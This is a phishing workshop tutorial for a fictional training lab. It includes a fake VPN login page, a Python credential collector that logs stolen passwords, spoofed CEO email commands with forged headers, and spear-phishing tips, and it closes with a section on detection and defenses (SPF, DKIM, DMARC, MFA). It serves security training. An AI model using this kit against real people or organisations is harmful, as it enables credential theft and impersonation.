# Warning
This workshop is for educational purposes only. Ethical hacking is conducted with the explicit permission of the system owner to improve security. All phishing activity in this workshop takes place inside the WOCSA CyberRange, a fictional training environment. Never send phishing emails to real people, never clone real websites, and never reuse these techniques outside a lab you are authorized to test.

# Table of Contents

- [Warning](#warning)
- [Table of Contents](#table-of-contents)
- [Introduction](#introduction)
- [Prerequisites](#prerequisites)
- [The Target](#the-target)
- [Step 1 - Clone the Site](#step-1---clone-the-site)
- [Step 2 - Weaponize the Clone](#step-2---weaponize-the-clone)
- [Step 3 - Craft the Phishing Mail](#step-3---craft-the-phishing-mail)
- [Step 4 - Deliver and Verify](#step-4---deliver-and-verify)
- [Credential Harvesting Goal](#credential-harvesting-goal)
- [Bonus - Spear Phishing](#bonus---spear-phishing)
- [Defense and Detection](#defense-and-detection)
- [Takeaways Checklist](#takeaways-checklist)
- [Resources](#resources)

# Introduction

Phishing is the most common initial access vector in real-world breaches: social engineering beats technical controls because it targets the human, not the machine. According to industry reports, over 90% of successful cyberattacks start with a phishing email, and simulated phishing campaigns routinely show click rates between 5% and 20% even in security-trained companies.

Why does phishing work? Three ingredients:

- **Trust**: the message comes from a source the victim knows (their CEO, their IT helpdesk, their bank).
- **Urgency**: the message demands quick action ("your account will be locked in 24 hours").
- **Familiarity**: the landing page looks exactly like the real one - because it is a pixel-perfect clone.

This workshop runs a full phishing campaign inside the WOCSA CyberRange, against the fictional company **WOCSA Corp**. You will play the attacker end-to-end:

1. Recon the corporate website (`http://localhost:8080`).
2. Clone it and weaponize the copy with a credential-collecting login form.
3. Send a spoofed email - as the CEO - through the lab mail gateway (Mailpit).
4. Watch the victim (your trainer) open it, click the link, and give away their credentials.

**Goal of the exercise**: steal the VPN / webmail credentials of a WOCSA Corp employee, then use them (in the lab!) to log in as them.

# Prerequisites

The CyberRange must be running with the DMZ profile, which provides the corporate site and the mail gateway:

```bash
cd CyberRange
docker compose --profile dmz up -d
```

Verify that both services are up:

```bash
docker compose ps
curl -s http://localhost:8080 | head -20
curl -s http://localhost:8025/api/v1/messages
```

You should see the WOCSA Corp website HTML and an empty JSON list of messages. For the full story (VPN, intranet wiki, workstations), also bring up the VPN and intranet profiles:

```bash
docker compose --profile dmz --profile vpn --profile intranet up -d
```

Tools used in this workshop:

| Tool | Where | Purpose |
|---|---|---|
| `wget` / `httrack` | kali-cai attacker box (or any host with the tools) | clone the corporate site |
| `python3` | any host | serve the clone and collect credentials |
| `swaks` | kali-cai | send the spoofed email |
| `nc` or `python3 smtplib` | fallback for hosts without swaks (DVWA container included) | send the spoofed email |
| Browser | host | read the victim inbox (Mailpit UI) |
| `curl` | host | Mailpit API (list / raw messages) |

# The Target

Open the corporate site in your browser:

```
http://localhost:8080
```

Explore it like an attacker would:

1. **Read everything**: services, about section, footer. Note that the site openly says it is fictional and "perfect for cloning, phishing and web security exercises" - that is your green light in this lab.
2. **Identify contact emails**: the contact section exposes `contact@wocsa-corp.local`. This tells you the company domain is `wocsa-corp.local`, so you can guess the naming pattern for employees (e.g. `ceo@wocsa-corp.local`).
3. **Look at the source**:

```bash
curl -s http://localhost:8080 | grep -i mailto
```

4. **Map the company story** (from the [CyberRange README](../../CyberRange/README.md)): WOCSA Corp employees connect through the VPN (wg-easy, admin UI at `http://localhost:51821`), work with the intranet wiki (dokuwiki, `10.5.20.10`), store files on the file server (sftpgo, `10.5.20.11`) and read their mail through the webmail (Mailpit). Workstations `10.5.20.21` and `10.5.20.22` are browser desktops where a victim (the trainer) will open your phishing mail.

Everything you learn here is ammunition for the email and the fake login page.

# Step 1 - Clone the Site

The goal is a local copy of `http://localhost:8080` that you control and can modify. Two options:

**Option A - wget (kali-cai attacker box):**

```bash
wget -mk http://localhost:8080
```

- `-m` mirrors the site (recursive, infinite depth within the site).
- `-k` rewrites links so the copy works offline.

**Option B - httrack (if you prefer a GUI-less crawler):**

```bash
httrack http://localhost:8080 -O wocsa-clone
```

Then serve the clone locally so the victim's browser can reach it:

```bash
python3 -m http.server 9000
```

Test it yourself from the browser:

```
http://<your-lan-ip>:9000
```

Note: if the victim is on a workstation inside the range (`10.5.20.21/.22`), your clone must be reachable from inside the lab network - use the LAN IP of your host (or an IP the workstation can route to), not `127.0.0.1`.

# Step 2 - Weaponize the Clone

A perfect clone with the original `mailto:` links does not steal credentials. You need a **login form** that looks like a WOCSA Corp service (the classic: "employee VPN portal") and sends the entered credentials to **your collector**.

1. Edit the cloned `index.html`: replace the hero section or add a banner linking to your fake portal, e.g. a button "Employee VPN Portal". Simpler: create a new page `portal.html` in the clone directory.

Minimal fake portal page (`portal.html`):

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>WOCSA Corp - Employee VPN Portal</title>
  <style>
    body { font-family: "Segoe UI", Roboto, Arial, sans-serif; background: #f5f7fa; }
    .box { max-width: 380px; margin: 10% auto; background: #fff; border: 1px solid #e1e6ee;
           border-radius: 8px; padding: 2rem; box-shadow: 0 2px 6px rgba(31,59,115,.06); }
    h1 { font-size: 1.2rem; color: #1f3b73; margin-bottom: 1rem; }
    input { width: 100%; padding: .6rem; margin-bottom: .8rem; border: 1px solid #cfd6e2; border-radius: 4px; }
    button { width: 100%; padding: .6rem; background: #1f3b73; color: #fff; border: 0; border-radius: 4px; cursor: pointer; }
    .note { margin-top: 1rem; font-size: .8rem; color: #7a8494; }
  </style>
</head>
<body>
  <div class="box">
    <h1>Employee VPN Portal</h1>
    <p style="color:#7a8494;margin-bottom:1rem;">New security policy: all employees must re-authenticate to keep VPN access.</p>
    <form action="http://<your-lan-ip>:8000" method="POST">
      <input type="text" name="username" placeholder="Username" autocomplete="off"><br>
      <input type="password" name="password" placeholder="Password" autocomplete="off"><br>
      <button type="submit">Log in</button>
    </form>
    <p class="note">WOCSA Corp IT Security - 2026 policy update</p>
  </div>
</body>
</html>
```

2. Serve this page together with the clone (`python3 -m http.server 9000` from the clone directory serves both `index.html` and `portal.html`).

3. Run the credential collector. Small `http.server` subclass that logs every POST to a file and console:

```python
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

class Collector(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8', 'replace')
        creds = parse_qs(body)
        with open('stolen.txt', 'a') as f:
            f.write(body + '\n')
        print('[+] Credentials captured:', creds)
        self.send_response(302)
        self.send_header('Location', 'http://<your-lan-ip>:9000/index.html')
        self.end_headers()

    def log_message(self, *args):
        pass

HTTPServer(('0.0.0.0', 8000), Collector).serve_forever()
```

Save it as `collector.py`, run `python3 collector.py`, and test it once:

```bash
curl -s -X POST http://localhost:8000 -d "username=test&password=test" -o /dev/null
cat stolen.txt
```

Flask alternative (if flask is available):

```python
from flask import Flask, request
app = Flask(__name__)

@app.route('/', methods=['POST'])
def collect():
    with open('stolen.txt', 'a') as f:
        f.write(f"{request.form}\n")
    print('[+] Credentials captured:', request.form)
    return '', 302, {'Location': 'http://<your-lan-ip>:9000/index.html'}

app.run(host='0.0.0.0', port=8000)
```

Note the redirect after login: the victim lands back on the real-looking site and believes the login "failed" or the session expired - classic post-phish behavior that hides the attack.

# Step 3 - Craft the Phishing Mail

The mail gateway (Mailpit) accepts mail from **any sender, without authentication** - by design in this lab. That is what makes sender spoofing possible. In the real world, DKIM/SPF/DMARC are supposed to prevent exactly this (see [Defense and Detection](#defense-and-detection)).

**Option A - swaks (kali-cai):**

```bash
swaks --to victim@wocsa-corp.local --from ceo@wocsa-corp.local \
  --server localhost:1025 \
  --header "Subject: [URGENT] VPN access expires in 24 hours - action required" \
  --body "Dear employee,

Our monitoring detected that your VPN credentials expire tonight. To avoid losing access to the intranet (wiki, file server), re-authenticate immediately at:

http://<your-lan-ip>:9000/portal.html

This is a mandatory security update.

Best regards,
Sarah Mitchell
CEO, WOCSA Corp"
```

Note: swaks sends `--from` as the envelope sender AND the `From:` header. To look more like a real campaign, add a distinct `Reply-To` and a spoofed `X-Mailer`:

```bash
swaks --to victim@wocsa-corp.local \
  --from ceo@wocsa-corp.local \
  --h-From: "'Sarah Mitchell (CEO)' <ceo@wocsa-corp.local>" \
  --h-Reply-To: "it-support@wocsa-corp.help" \
  --h-Return-Path: "<ceo@wocsa-corp.local>" \
  --h-X-Mailer: "Microsoft Outlook 16.0" \
  --server localhost:1025 \
  --header "Subject: [URGENT] VPN access expires in 24 hours - action required" \
  --body "..."
```

**Option B - manual SMTP dialogue with nc (any host without swaks, e.g. the DVWA container):**

From your host, against the published port:

```bash
nc localhost 1025
```

Then type the SMTP dialogue (end the DATA block with a line containing only a dot):

```
HELO attacker.local
MAIL FROM:<ceo@wocsa-corp.local>
RCPT TO:<victim@wocsa-corp.local>
DATA
From: "Sarah Mitchell (CEO)" <ceo@wocsa-corp.local>
Reply-To: <it-support@wocsa-corp.help>
Return-Path: <ceo@wocsa-corp.local>
X-Mailer: Microsoft Outlook 16.0
Subject: [URGENT] VPN access expires in 24 hours

Dear employee,
... your message body ...
.
QUIT
```

From inside the DVWA container (it has `nc` and `python3`, but the gateway is at the lab IP `10.5.10.13`, not `127.0.0.1`):

```bash
nc 10.5.10.13 1025
```

same dialogue as above. Or with python3 (works from the host on `127.0.0.1:1025` too):

```python
import smtplib

msg = """From: "Sarah Mitchell (CEO)" <ceo@wocsa-corp.local>
To: <victim@wocsa-corp.local>
Reply-To: <it-support@wocsa-corp.help>
X-Mailer: Microsoft Outlook 16.0
Subject: [URGENT] VPN access expires in 24 hours

Dear employee, re-authenticate now: http://<your-lan-ip>:9000/portal.html
"""

s = smtplib.SMTP('localhost', 1025)   # from DVWA: smtplib.SMTP('10.5.10.13', 1025)
s.sendmail('ceo@wocsa-corp.local', ['victim@wocsa-corp.local'], msg)
s.quit()
```

**Header craft - what each spoofed header does:**

| Header | Purpose | Attacker trick |
|---|---|---|
| `From:` | displayed sender in the mail client | claim to be the CEO |
| `Reply-To:` | where replies go | a look-alike domain you control, so a cautious victim who hits "Reply" still talks to you |
| `Return-Path:` / envelope sender | where bounces go | spoofed too, so the mail looks consistent under inspection |
| `X-Mailer:` | mail client signature | "Microsoft Outlook 16.0" makes the mail look like it came from a real desktop client |
| `Subject:` + body | the hook | urgency + a link to your clone |

**Content tips** (all verified against the lab story): reference real internal services (VPN, wiki at `10.5.20.10`, file server) to look authentic, keep the urgency high but plausible, and link to `http://<your-lan-ip>:9000/portal.html` - never to `localhost`, because the victim's browser is not your machine.

# Step 4 - Deliver and Verify

1. **Send the mail** (Step 3 command) - Mailpit accepts anything, so it lands immediately.

2. **Verify it is in the victim's inbox** - open the Mailpit web UI:

```
http://localhost:8025
```

or via the API (also reachable from inside the lab at `10.5.10.13:8025/api/v1/messages`):

```bash
curl -s http://localhost:8025/api/v1/messages | python3 -m json.tool
```

3. **Analyze the raw message** like a mail administrator would. Find the message `ID` in the listing, then:

```bash
curl -s http://localhost:8025/api/v1/message/<ID>/raw
```

Check the delivered headers: `From:`, `Reply-To:`, `Return-Path:`, `X-Mailer:` - everything you spoofed, verbatim. There is no DKIM signature and no SPF verdict: Mailpit has none of the anti-spoofing controls of a real mail server (see [Defense and Detection](#defense-and-detection)).

4. **Have the victim click**: the trainer opens the mail on a workstation (`10.5.20.21/.22` browser desktop, via VPN) and clicks your link. The portal page loads, the victim enters credentials.

5. **Check your collector logs**:

```bash
cat stolen.txt
tail -f stolen.txt   # watch it live while the victim types
```

You should see the POST with `username=...&password=...`, plus your collector's `[+] Credentials captured` output on the console.

# Credential Harvesting Goal

What are the stolen credentials worth? They are **real lab credentials** - here is what a phished victim unlocks in this range:

1. **VPN admin (wg-easy)**: the phishing mail can push the victim to "re-validate" on a clone of the VPN admin UI. The real credentials are `WG_ADMIN_USER` / `WG_ADMIN_PASSWORD` in `CyberRange/.env` (admin UI at `http://localhost:51821`). Harvesting them lets you mint your own VPN peers - attacker persistence inside the corporate network.

2. **Grafana monitoring**: at `10.5.20.14:3000` (VPN required) with default credentials `admin` / `admin`. Pwning Grafana leaks the wg-easy and Mailpit API credentials stored in its provisioned Infinity data source, and a pwned Grafana can query those two APIs through it - exactly the "reuse harvested credentials" chain this workshop illustrates.

3. **Fake "employee VPN portal" scenario**: the simplest and cleanest for a live demo - the victim types their (invented) VPN username and password into your clone, you capture them, then you log into the lab's real VPN admin UI with them (use the credentials from `.env` to stand in for the "phished" ones) and show the trainers: from one phishing mail to full VPN access.

Pick the scenario that fits your session length; all three demonstrate the same lesson: one set of stolen credentials is the first domino.

# Bonus - Spear Phishing

Generic phishing casts a wide net; spear phishing personalizes the bait with information gathered about one specific target. The lab gives you three OSINT sources to mine - use them to make your email irresistible:

1. **The company inbox (Mailpit)**: read the victim's real mail first:

```bash
curl -s http://localhost:8025/api/v1/messages | python3 -m json.tool
```

Note names, topics, deadlines, ongoing projects. Reference one of them in your mail: "About the invoice you discussed this morning..." - social proof built from their own inbox.

2. **The corporate site**: contact addresses, product names, the company tone. Match the writing style and the exact branding of the site on your clone.

3. **The intranet wiki (dokuwiki)**: connect through the VPN, browse `http://10.5.20.10`, and read internal pages (procedures, team names, "how to reset your VPN password" pages). A phishing mail that mirrors the internal password-reset procedure of the company is far more credible.

Then craft the email around one specific victim and one specific pretext, and compare the response: spear phishing consistently beats generic phishing in click rates - and in this lab, you can prove it.

# Defense and Detection

Now flip sides: how would an employee (or the mail admin) catch this attack?

**In the lab, every message gives itself away if you look:**

- **Sender mismatch**: the `From:` address (`ceo@wocsa-corp.local`) does not match any real verified identity. Mailpit shows the sender exactly as claimed - hover and question it.
- **Suspicious URL**: the link points to `http://<your-lan-ip>:9000/portal.html`, not to `http://localhost:8080` or an internal service. Always hover before clicking; check the domain, not the text.
- **Urgency**: "expires in 24 hours" is engineered to stop you from thinking. Legitimate IT never pressures like this.
- **No signatures**: open the raw view (`curl http://localhost:8025/api/v1/message/<ID>/raw`) - there is no `DKIM-Signature`, no `Authentication-Results` with SPF/DMARC verdicts. A real corporate gateway would have them.

**Why Mailpit has none of this (it is a lab):**

| Control | What it does | Mailpit |
|---|---|---|
| **SPF** | checks the sending server is authorized for the sender domain | none - accepts any sender |
| **DKIM** | cryptographic signature proving the mail came from the domain | none - nothing to verify |
| **DMARC** | policy combining SPF+DKIM, tells the receiver to reject/quarantine spoofed mail | none - no policy exists |

Mailpit is an intentional catch-all: it demonstrates what email would look like with zero authentication, which is precisely why it is safe to train on it.

**Real-world defenses:**

- **Reporting**: employees report suspicious mails instead of clicking (real companies use a "report phishing" button; your trainer is your SOC).
- **Browser protections**: modern browsers warn about known phishing sites; password managers refuse to autofill credentials on look-alike domains because the domain does not match the stored one.
- **MFA**: even stolen credentials are useless without the second factor (this is what your fake VPN portal scenario is missing - and what real VPNs enforce).
- **Mail gateway controls**: DKIM/SPF/DMARC enforcement, attachment sandboxing, URL rewriting with click-time checks - the exact controls Mailpit deliberately omits.

# Takeaways Checklist

- [ ] Explored `http://localhost:8080` and identified the contact email and company story
- [ ] Cloned the site (`wget -mk`) and served it locally (`python3 -m http.server 9000`)
- [ ] Weaponized the clone with a fake VPN portal page POSTing to your collector
- [ ] Verified the collector works (`curl` test POST, `stolen.txt` populated)
- [ ] Sent a spoofed CEO mail through `localhost:1025` (swaks or nc/python3)
- [ ] Confirmed the mail in the victim inbox (`http://localhost:8025` and API)
- [ ] Read the raw message and identified the spoofed headers
- [ ] Had the victim click, and captured credentials in the collector logs
- [ ] Understood what the stolen credentials unlock (wg-easy, Grafana, VPN portal scenario)
- [ ] Explained to someone else how DKIM/SPF/DMARC would have stopped this mail

# Resources

- [swaks - Swiss Army Knife for SMTP](https://github.com/jetmore/swaks) - official documentation of the tool used to send the phishing mail
- [Mailpit](https://github.com/axllent/mailpit) - the lab mail gateway (SMTP catch-all + web UI + API)
- [Mailpit API](https://mailpit.axllent.io/docs/api-v1/) - reference for `messages` and `message/{ID}/raw` endpoints used in this workshop
- [GNU Wget manual](https://www.gnu.org/software/wget/manual/wget.html) - the `-mk` mirror options
- [HTTrack](https://www.httrack.com/) - alternative site mirroring tool
- [GoPhish](https://getgophish.com/) - open-source phishing campaign framework (further reading: manages campaigns, tracks clicks and submitted credentials at scale)
- [OWASP Phishing Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Phishing_Attacks_Cheat_Sheet.html) - defensive guidance and detection controls
- [DMARC.org](https://dmarc.org/) - the standard that kills sender spoofing in real mail systems
- [WOCSA CyberRange](../../CyberRange/README.md) - the lab this workshop runs in

---

**Summary report**: Full phishing lifecycle executed against the fictional WOCSA Corp lab - cloned `localhost:8080`, weaponized it with a credential-collecting VPN portal, spoofed a CEO email through Mailpit's open SMTP relay (no SPF/DKIM/DMARC by design), verified delivery in the victim inbox, and captured the phished credentials that unlock real lab targets (wg-easy admin, Grafana) - all inside the CyberRange, for education only.
